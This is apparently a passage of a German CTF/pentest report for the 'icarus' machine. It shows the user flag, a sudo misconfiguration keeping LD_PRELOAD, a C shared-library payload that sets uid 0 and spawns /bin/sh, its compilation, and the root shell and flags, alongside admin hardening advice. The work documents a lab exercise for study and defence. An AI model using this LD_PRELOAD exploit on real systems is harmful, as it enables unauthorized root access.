+             <p class="evaluation"><strong>Bewertung:</strong> Das Auffinden der Datei <code>user.txt</code> ist vielversprechend, da dies oft die Datei ist, die den User-Flag in CTF-Szenarien oder Pentests enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt der Datei <code>user.txt</code> auslesen. Die Datei <code>flag.sh</code> ebenfalls untersuchen, da sie möglicherweise Hinweise oder Funktionen enthält.<br><strong>Empfehlung (Admin):</strong> Standardmäßig sollten Home-Verzeichnisse für andere Benutzer nicht lesbar sein. Überprüfen der Berechtigungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">icarus@icarus:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">Dontgotothesun</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>cat user.txt</code> liest den Inhalt der Datei <code>user.txt</code> und gibt ihn auf der Konsole aus.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der User-Flag lautet `Dontgotothesun`. Das erste der beiden Hauptziele ist erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den User-Flag dokumentieren. Nun den Fokus vollständig auf die Privilegieneskalation legen, um Root-Zugriff zu erlangen.<br><strong>Empfehlung (Admin):</strong> Flags sind typischerweise Teil von CTF-Übungen. In realen Systemen sollten sensible Daten entsprechend geschützt werden.</p>
+
+            <!-- Privilege Escalation Section Title im Originaltext -->
+            <p class="analysis"><strong>Analyse:</strong> Der folgende Abschnitt konzentriert sich auf die Eskalation der Berechtigungen vom Benutzer `icarus` zum `root`-Benutzer.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">icarus@icarus:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for icarus on icarus:
+    env_reset, mail_badpass, <span class="password">env_keep+=LD_PRELOAD</span>,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User icarus may run the following commands on icarus:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/id</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>sudo -l</code> listet die Befehle auf, die der aktuelle Benutzer (`icarus`) mit `sudo` (also mit erhöhten Rechten) ausführen darf. Die Ausgabe zeigt zwei entscheidende Punkte:
+             <ol>
+                 <li><code>(ALL : ALL) NOPASSWD: /usr/bin/id</code>: Der Benutzer `icarus` darf den Befehl <code>/usr/bin/id</code> als jeder Benutzer (inklusive `root`) ausführen, ohne ein Passwort eingeben zu müssen.</li>
+                 <li><code>env_keep+=LD_PRELOAD</code>: Diese Option in den `Defaults`-Einstellungen bedeutet, dass die Umgebungsvariable <code>LD_PRELOAD</code> erhalten bleibt, wenn `sudo` ausgeführt wird. <code>LD_PRELOAD</code> ist eine Linux-Umgebungsvariable, die dazu verwendet werden kann, eine spezifische Shared Library vor allen anderen zu laden, wenn ein Programm gestartet wird.</li>
+             </ol>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine kritische Fehlkonfiguration und ein klassischer Vektor für Privilegieneskalation! Die Kombination aus der Erlaubnis, einen beliebigen Befehl via `sudo` (hier `/usr/bin/id`, aber das ist fast unerheblich) auszuführen UND der Beibehaltung der `LD_PRELOAD`-Variable ermöglicht es, eigenen Code in Form einer Shared Library zu erstellen, der dann beim Ausführen des `sudo`-Befehls mit Root-Rechten geladen und ausgeführt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Eine einfache C-Datei erstellen, die eine Shell startet (z.B. in der `_init`-Funktion). Diese C-Datei als Shared Object (<code>.so</code>) kompilieren. Den `sudo`-Befehl dann mit gesetzter `LD_PRELOAD`-Variable ausführen, die auf das kompilierte Shared Object zeigt (<code>sudo LD_PRELOAD=/pfad/zur/shell.so /usr/bin/id</code>).<br><strong>Empfehlung (Admin):</strong> Die Option `env_keep+=LD_PRELOAD` (oder ähnliche gefährliche Variablen wie `LD_LIBRARY_PATH`) sollte niemals in der `sudoers`-Konfiguration global oder für unprivilegierte Benutzer gesetzt werden. Stattdessen nur spezifische, benötigte Variablen explizit erlauben. Die Berechtigung, `id` mit `sudo` auszuführen, ist an sich ungefährlich, aber in dieser Kombination fatal. Überprüfen Sie die `sudoers`-Datei sorgfältig auf unsichere Konfigurationen.</p>
+
+            <!-- Kommentarblöcke aus dem Originaltext -->
+             <p class="analysis"><strong>Analyse:</strong> Die folgenden Kommentare aus dem Originalbericht erklären die geplante Vorgehensweise zur Ausnutzung der `LD_PRELOAD`-Schwachstelle.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt im Originaltext -->
+                    <pre>
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+The real trick here it’s the env_keep+=LD_PRELOAD
+Linux Privilege Escalation using LD_Preload
+Follow this guide we can create a C script
+and make this script a shared library
+
+Change to /tmp directory and create a C script
+:::::::::::::::::::::::::::::::::::::::::::::::::::
+                    </pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">icarus@icarus:~$ <span class="command">cd /tmp/</span></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Wechsel in das Verzeichnis <code>/tmp</code>. Dieses Verzeichnis ist üblicherweise für alle Benutzer beschreibbar und wird daher oft zum Ablegen von temporären Dateien oder Exploits während eines Pentests verwendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein vorbereitender Schritt, um den Exploit-Code zu erstellen und zu kompilieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass das Verzeichnis beschreibbar ist und genügend Platz bietet.<br><strong>Empfehlung (Admin):</strong> Das <code>/tmp</code>-Verzeichnis sollte mit Optionen wie <code>noexec</code> und <code>nosuid</code> gemountet werden, um die Ausführung von Binärdateien oder das Setzen von SUID-Bits zu verhindern. Dies hätte diesen spezifischen Exploit zwar nicht verhindert (da die Ausführung über `sudo` erfolgt), ist aber eine allgemeine Härtungsmaßnahme.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">icarus@icarus:/tmp$ <span class="command">nano shell.c</span></div>
+                     <!-- Inhalt der Datei shell.c -->
+                    <pre>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD"); /* Wichtig: Variable entfernen, um Endlosschleifen zu vermeiden */
+	setgid(0); /* Setze Gruppen-ID auf 0 (root) */
+	setuid(0); /* Setze User-ID auf 0 (root) */
+	system("/bin/sh"); /* Starte eine Shell */
+}
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit dem Texteditor `nano` wird eine neue Datei namens <code>shell.c</code> erstellt. Der C-Code definiert eine Funktion namens <code>_init</code>. Diese Funktion wird automatisch ausgeführt, wenn eine Shared Library geladen wird. Der Code in <code>_init</code> tut Folgendes:
+                <ul>
+                    <li><code>unsetenv("LD_PRELOAD")</code>: Entfernt die `LD_PRELOAD`-Variable, um zu verhindern, dass die Shell, die gleich gestartet wird, versucht, die Library erneut zu laden (was zu einer Endlosschleife führen könnte).</li>
+                    <li><code>setgid(0)</code> und <code>setuid(0)</code>: Setzt die Gruppen- und Benutzer-ID des Prozesses auf 0, was der ID von `root` entspricht. Dies ist der eigentliche Schritt der Privilegieneskalation.</li>
+                    <li><code>system("/bin/sh")</code>: Führt den Befehl <code>/bin/sh</code> aus, wodurch eine neue Shell gestartet wird. Da die User-ID zuvor auf 0 gesetzt wurde, wird dies eine Root-Shell sein.</li>
+                </ul>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser C-Code ist ein einfacher, aber effektiver Payload, um die `LD_PRELOAD`-Schwachstelle auszunutzen und eine Root-Shell zu erhalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Code sorgfältig prüfen und sicherstellen, dass er korrekt ist. Anschließend kompilieren.<br><strong>Empfehlung (Admin):</strong> Dies zeigt, wie einfach es ist, Code zur Ausnutzung von `LD_PRELOAD` zu erstellen. Die Prävention liegt in der korrekten `sudoers`-Konfiguration.</p>
+
+              <!-- Kommentarblock aus dem Originaltext -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt im Originaltext -->
+                    <pre>
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+                    </pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">icarus@icarus:/tmp$ <span class="command">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span></div>
+                    <pre>
+shell.c: In function ‘_init’:
+shell.c:6:2: warning: implicit declaration of function ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
+  setgid(0);
+  ^~
+  setenv
+shell.c:7:2: warning: implicit declaration of function ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
+  setuid(0);
+  ^~
+  setenv
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>gcc</code> wird verwendet, um die C-Datei <code>shell.c</code> zu kompilieren.
+                <ul>
+                    <li><code>-fPIC</code>: Erzeugt positionsunabhängigen Code, notwendig für Shared Libraries.</li>
+                    <li><code>-shared</code>: Erzeugt eine Shared Library (<code>.so</code>-Datei).</li>
+                    <li><code>-o shell.so</code>: Gibt den Namen der Ausgabedatei an (<code>shell.so</code>).</li>
+                    <li><code>shell.c</code>: Die zu kompilierende Quelldatei.</li>
+                    <li><code>-nostartfiles</code>: Bindet nicht die Standard-C-Startdateien ein (hier verwendet, um die Library klein zu halten und Abhängigkeiten zu minimieren, insbesondere wenn nur `_init` gebraucht wird).</li>
+                </ul>
+                Der Compiler gibt Warnungen aus (`implicit declaration`), weil die Header-Dateien für `setgid` und `setuid` (normalerweise `unistd.h` und `sys/types.h`) nicht explizit für diese Funktionen eingebunden wurden. Für diesen einfachen Exploit sind die Warnungen jedoch meist unkritisch, da die Funktionen in der Standard-C-Library vorhanden sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit-Code wurde erfolgreich in eine Shared Library (<code>shell.so</code>) kompiliert. Die Warnungen können ignoriert werden, da der Exploit trotzdem funktionieren wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die kompilierte Datei <code>shell.so</code> ist nun bereit, mit `LD_PRELOAD` und `sudo` verwendet zu werden.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass Entwicklungswerkzeuge wie `gcc` nicht unnötigerweise auf Produktivsystemen installiert sind, um die Kompilierung von Exploits vor Ort zu erschweren.</p>
+
+             <!-- Kommentarblock aus dem Originaltext -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt im Originaltext -->
+                    <pre>
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept: Privilege Escalation via LD_PRELOAD</h2>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist der Proof of Concept, der die Ausnutzung der zuvor identifizierten `sudo`-Fehlkonfiguration in Verbindung mit `LD_PRELOAD` demonstriert. Der Befehl <code>sudo id</code> wird ausgeführt, aber die Umgebungsvariable <code>LD_PRELOAD</code> wird so gesetzt, dass sie auf unsere zuvor kompilierte Shared Library <code>/tmp/shell.so</code> zeigt. Da die `sudoers`-Datei die Beibehaltung von `LD_PRELOAD` erlaubt (`env_keep+=LD_PRELOAD`), wird das Betriebssystem angewiesen, unsere `shell.so` zu laden, bevor das `id`-Programm gestartet wird. Die `_init`-Funktion in unserer Library wird ausgeführt, setzt die User-ID auf 0 (root) und startet eine Shell (<code>/bin/sh</code>), noch bevor das eigentliche `id`-Programm seine Arbeit aufnimmt.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">icarus@icarus:/tmp$ <span class="command">sudo LD_PRELOAD=/tmp/shell.so id</span></div>
+                    <pre>
+<span class="password">#</span> id
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="password">#</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, der Root-Zugriff war erfolgreich! Der Prompt ändert sich zu <code>#</code>, was den Root-Benutzer anzeigt. Der unmittelbar danach ausgeführte `id`-Befehl (der automatisch von der neuen Shell ausgeführt wird oder manuell eingegeben wurde) bestätigt dies mit `uid=0(root) gid=0(root) groups=0(root)`. Die Privilegieneskalation war erfolgreich und das System ist nun vollständig kompromittiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Root-Flag suchen und dokumentieren. Gegebenenfalls Persistenzmechanismen einrichten (in einem echten Szenario, nicht CTF). Die Umgebung als Root weiter untersuchen.<br><strong>Empfehlung (Admin):</strong> Die `sudoers`-Fehlkonfiguration (insbesondere `env_keep+=LD_PRELOAD`) sofort beheben. Das System auf mögliche Hintertüren oder weitere Kompromittierungen untersuchen, die durch den erlangten Root-Zugriff entstanden sein könnten.</p>
+
+             <!-- Fortsetzung innerhalb der Root-Shell -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">ls</span></div>
+                    <pre>
+flag.sh  root.txt
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>ls</code> wird in der neuen Root-Shell ausgeführt, vermutlich im Home-Verzeichnis des Root-Benutzers (<code>/root</code>). Es werden die Dateien <code>flag.sh</code> und <code>root.txt</code> gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei <code>root.txt</code> wurde gefunden. Dies ist sehr wahrscheinlich der Root-Flag.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt von <code>root.txt</code> auslesen.<br><strong>Empfehlung (Admin):</strong> Überprüfen, welche Dateien sich im Root-Home befinden und ob deren Berechtigungen korrekt sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">cat root.txt</span></div>
+                    <pre>
+<span class="password">RIPicarus</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>cat root.txt</code> liest den Inhalt der Datei <code>root.txt</code>.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Root-Flag lautet `RIPicarus`. Beide Hauptziele des Penetrationstests wurden erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Root-Flag dokumentieren. Den Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Wie beim User-Flag, handelt es sich hier um ein CTF-Element.</p>
+
+            <!-- Hinweise im Originaltext -->
+            <p class="analysis"><strong>Analyse:</strong> Die folgenden Zeilen im Originaltext deuten auf den erfolgreichen Abschluss der Privilegieneskalation hin.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt -->
+                    <pre>
+                                                   Privilege Escalation erfolgreich
+                    </pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="flags">
+             <!-- Die Struktur folgt dem Template, zentriert durch CSS -->
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">Dontgotothesun</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">RIPicarus</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 12. November 2022</p>
+    </footer>
+</body>
+</html>
